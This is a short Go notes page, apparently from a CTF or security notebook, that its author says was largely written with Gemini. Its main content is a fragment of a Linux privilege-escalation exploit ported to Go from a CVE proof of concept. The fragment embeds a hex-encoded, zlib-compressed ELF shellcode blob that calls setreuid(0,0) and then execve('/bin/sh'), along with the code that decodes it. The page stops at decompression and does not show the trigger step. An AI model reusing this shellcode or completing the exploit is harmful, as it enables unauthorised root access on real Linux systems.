# Useful Go

**Warning `Large Quantity` of this article were created with the aid `Gemini` and human consultation of `Go Standard Libraries`



Chris Pritchard's [GO-SCRIPTING.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/GO-SCRIPTING.md)

Inspired by [0xdf223 copy-fail-CVE-2026-31431](https://github.com/0xdf223/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp_deobfuscated.py)  and a desire to try writing a Linux Exploit in Golang this worked
```go
// 0xdf
// 160-byte hand-rolled static x86-64 ELF. Entry point is shellcode that does:
//    setreuid(0, 0); execve("/bin/sh", NULL, NULL); exit(0);
// Stored zlib-compressed because the original PoC did the same.

		const shellcodeHex string = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
        scBytes, err := hex.DecodeString(shellcodeHex)
        if err != nil {
                fmt.Printf("Error decoding hex: %v\n", err)
                return
        }

        scReader, err := zlib.NewReader(bytes.NewReader(scBytes))
        var patchElf []byte

        if err != nil {
                fmt.Printf("ZLIB header invalid, falling back to raw DEFLATE: %v\n", err)
                flateReader := flate.NewReader(bytes.NewReader(scBytes))
                patchElf, err = io.ReadAll(flateReader)
                flateReader.Close()
                if err != nil {
                        fmt.Printf("Failed to decompress shellcode: %v\n", err)
                        return
                }
        } else {
                defer scReader.Close()
                patchElf, err = io.ReadAll(scReader)
                if err != nil {
                        fmt.Printf("Failed to read zlib stream: %v\n", err)
                        return
                }
        }

        fmt.Printf("Successfully decompressed %d bytes of shellcode.\n", len(patchElf))


```



## References

[learnxinyminutes - Go](https://learnxinyminutes.com/docs/go/)
[adrianhesketh dividing-a-go-project-into-multiple-packages blog](https://adrianhesketh.com/2016/04/19/dividing-a-go-project-into-multiple-packages/)
[GitHub Chris Pritchard GO-SCRIPTING.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/GO-SCRIPTING.md)